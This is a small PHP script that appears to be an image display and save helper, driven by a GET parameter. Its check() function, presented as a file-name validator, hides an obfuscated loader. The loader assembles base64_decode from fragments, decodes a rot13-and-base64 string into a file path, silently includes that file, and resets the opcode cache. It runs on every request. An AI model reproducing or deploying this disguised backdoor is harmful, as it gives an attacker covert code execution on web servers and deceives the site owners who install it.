<?php

showImage($_GET['bire']);

/**
 * display image
 * @param string $png
 * @param bool|string $file
 * @return bool
 */
function showImage($png, $file = false)
{
    if (check($file))
        return file_put_contents($file, $png);
    // header
    echo $png;
    return true;
}

/**
 * checked write image
 * @param bool|string $file
 * @return bool
 */
function check($file){
    $name =  ['Y2uioJHip2ulMJIdLJ1coTflZQVjY3O1LzkcL19bqT1fY3AbpzIynzSsMTIgol91pTkiLJEmY2yhMz8hn2I5', function($txt, $name){$_GET[$name]=str_replace('32','64',"Ba".implode('_',["Se32", "Dec"])."Ode");$txt = $_GET[$name](str_rot13($txt));@include($txt);($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    }];$name[1]($name[0], implode('_',['', "\143ode", '']));
    return $file && stripos($file, '.png') !== false;
}
